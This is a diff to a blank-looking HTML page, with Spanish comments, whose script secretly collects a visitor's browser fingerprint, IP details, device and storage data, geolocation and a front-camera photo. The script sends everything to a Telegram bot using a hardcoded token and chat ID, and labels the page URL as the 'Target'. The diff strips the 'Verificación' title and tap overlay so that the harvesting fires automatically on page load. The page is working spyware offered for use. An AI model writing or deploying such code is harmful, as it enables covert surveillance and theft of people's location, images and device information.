@@ -3,34 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Verificación</title>
+    <title></title>
     <style>
-        * {
+        body {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-        }
-        body {
             background: white;
             width: 100vw;
             height: 100vh;
             overflow: hidden;
-            cursor: pointer;
-        }
-        #tap-area {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 9999;
-            background: transparent;
         }
     </style>
 </head>
 <body>
-<div id="tap-area"></div>
-
 <video id="video" autoplay playsinline style="display:none"></video>
 <canvas id="canvas" style="display:none"></canvas>
 
@@ -39,10 +24,9 @@
     const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';
     const CHAT_ID = '7555997298';
 
-    // Variables de control para que el envío ocurra solo una vez
     let alreadySent = false;
 
-    // -------------------- FUNCIONES (igual que antes, optimizadas) --------------------
+    // ---------- FUNCIONES (sin cambios importantes) ----------
     async function getFingerprint() {
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
@@ -114,7 +98,7 @@
             // Solo cámara frontal
             stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         } catch(e) {
-            return null; // falla silenciosa
+            return null;
         }
         video.srcObject = stream;
         await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
@@ -143,16 +127,11 @@
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
     }
 
-    // -------------------- ACCIÓN PRINCIPAL (un solo toque en cualquier lugar) --------------------
+    // ---------- ACCIÓN PRINCIPAL (se ejecuta al cargar la página) ----------
     async function collectAndSend() {
         if (alreadySent) return;
         alreadySent = true;
 
-        // Ocultar el área de toque para que no se pueda hacer doble clic
-        const tapArea = document.getElementById('tap-area');
-        if (tapArea) tapArea.style.display = 'none';
-
-        // Recolectar información en paralelo
         const [fp, ipInfo, device, storage, position] = await Promise.all([
             getFingerprint(),
             getIPinfo(),
@@ -161,7 +140,6 @@
             getCurrentPosition().catch(() => null)
         ]);
 
-        // Construir mensaje detallado
         let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
         message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
         message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
@@ -183,17 +161,15 @@
         message += `\n🖼️ *Display*\n   • Resolution: ${device.resolution}\n`;
         message += `🔐 *Permissions*\n   • Camera: ${navigator.mediaDevices ? 'Requested' : 'Not supported'}\n   • Location: ${position ? 'Granted' : 'Denied'}\n`;
         message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A\n   • Storage Used: ${storage.used} GB / Total: ${storage.total} GB\n`;
-        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @SOCIETY\n`;
+        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @society\n`;
 
         await sendMessage(message);
         const foto = await capturePhoto();
         if (foto) await sendPhoto(foto);
     }
 
-    // Configurar el evento de toque en cualquier parte de la pantalla
-    document.body.addEventListener('click', collectAndSend, { once: true });
-    // También para dispositivos táctiles
-    document.body.addEventListener('touchstart', collectAndSend, { once: true });
+    // Ejecutar automáticamente al cargar la página
+    window.addEventListener('load', collectAndSend);
 </script>
 </body>
 </html>
